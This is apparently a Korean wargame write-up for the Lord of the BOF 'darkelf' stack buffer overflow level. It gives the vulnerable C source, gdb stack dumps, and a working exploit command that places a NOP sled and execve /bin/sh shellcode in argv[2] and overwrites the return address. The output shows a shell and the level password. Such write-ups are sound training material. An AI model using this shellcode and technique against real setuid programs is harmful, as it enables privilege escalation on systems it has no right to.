# darkelf

```c
[wolfman@localhost wolfman]$ cat darkelf.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkelf
        - egghunter + buffer hunter + check length of argv[1]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

wolfman에서 argv[1]의 사이즈까지 정해주는 조건이 추가된 문제이다. 

처음에는 system의 /bin/bash를 찾아서 실행시켜주는 코드를 짜려고 했는데 뭔가 갑자기 너무 어려워진 느낌이라 다른 조건을 찾아보다가 환경 변수에서 기본적으로 SHELL이라는 변수가 /bin/bash를 가지고 있는 것을 확인해서 환경 변수의 주소를 ret값에 덥어 씌워 공격해보았다. 하지만 illegal instruction이라는 메세지가 뜨며 제대로 나오지 않았고 때문에 더 좋은 방법을 찾기위해서 write up을 찾아 보다가 argv의 개수에는 조건이 없다는 것을  알게 되었다. 

이제 방법을 알았으니 argv[2]의 주소를 구하고 공격해보도록 하겠다. 

```bash
[wolfman@localhost wolfman]$ gdb -q attackme
(gdb) set disassembly-flavor intel
(gdb) b*main
Breakpoint 1 at 0x8048500
(gdb) r `python -c 'print "\x90"*48+" "+"F"*100'`
Starting program: /home/wolfman/attackme `python -c 'print "\x90"*48+" "+"F"*100'`

Breakpoint 1, 0x8048500 in main ()
(gdb) x/300x $esp
0xbffffa7c:     0x400309cb      0x00000003      0xbffffac4      0xbffffad4
0xbffffa8c:     0x40013868      0x00000003      0x08048450      0x00000000
0xbffffa9c:     0x08048471      0x08048500      0x00000003      0xbffffac4
0xbffffaac:     0x08048390      0x0804864c      0x4000ae60      0xbffffabc
0xbffffabc:     0x40013e90      0x00000003      0xbffffbc2      0xbffffbd9
0xbffffacc:     0xbffffc0a      0x00000000      0xbffffc6f      0xbffffc91
0xbffffadc:     0xbffffc9b      0xbffffca9      0xbffffcc8      0xbffffcd8
0xbffffaec:     0xbffffcf0      0xbffffd0d      0xbffffd2c      0xbffffd37
0xbffffafc:     0xbffffd45      0xbffffd88      0xbffffd9b      0xbffffdb0
0xbffffb0c:     0xbffffdc0      0xbffffdcd      0xbffffdec      0xbffffdf7
0xbffffb1c:     0xbffffe08      0xbffffe1a      0xbffffe22      0x00000000
0xbffffb2c:     0x00000003      0x08048034      0x00000004      0x00000020
0xbffffb3c:     0x00000005      0x00000006      0x00000006      0x00001000
0xbffffb4c:     0x00000007      0x40000000      0x00000008      0x00000000
0xbffffb5c:     0x00000009      0x08048450      0x0000000b      0x000001f9
0xbffffb6c:     0x0000000c      0x000001f9      0x0000000d      0x000001f9
0xbffffb7c:     0x0000000e      0x000001f9      0x00000010      0x0fabfbff
0xbffffb8c:     0x0000000f      0xbffffbbd      0x00000000      0x00000000
0xbffffb9c:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffbac:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffbbc:     0x38366900      0x682f0036      0x2f656d6f      0x666c6f77
0xbffffbcc:     0x2f6e616d      0x61747461      0x656d6b63      0x90909000
0xbffffbdc:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffbec:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffbfc:     0x90909090      0x90909090      0x90909090      0x46460090
0xbffffc0c:     0x46464646      0x46464646      0x46464646      0x46464646
0xbffffc1c:     0x46464646      0x46464646      0x46464646      0x46464646
0xbffffc2c:     0x46464646      0x46464646      0x46464646      0x46464646
0xbffffc3c:     0x46464646      0x46464646      0x46464646      0x46464646
0xbffffc4c:     0x46464646      0x46464646      0x46464646      0x46464646
0xbffffc5c:     0x46464646      0x46464646      0x46464646      0x46464646
```

gdb를 까보고 argv[2]자리에 F를 넣어서 주소를 확인하니 0xbffffc0c임을 알 수 있다.

이제 ret자리에 argv[2]의 주소를 덥어주고 argv[2]에는 NOP sled와 쉘코들 넣어서 공격을 시도해보자.

```bash
[wolfman@localhost wolfman]$ ./darkelf `python -c 'print "\x90"*40+"\xe0\x8a\x05\x40"+"\x0c\xfc\xff\xbf"+" "+"\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒@
▒▒▒
bash$ whoami
darkelf
bash$ my-pass
euid = 506
kernel crashed
```

darkelf의 password는 kernel crashed이다. 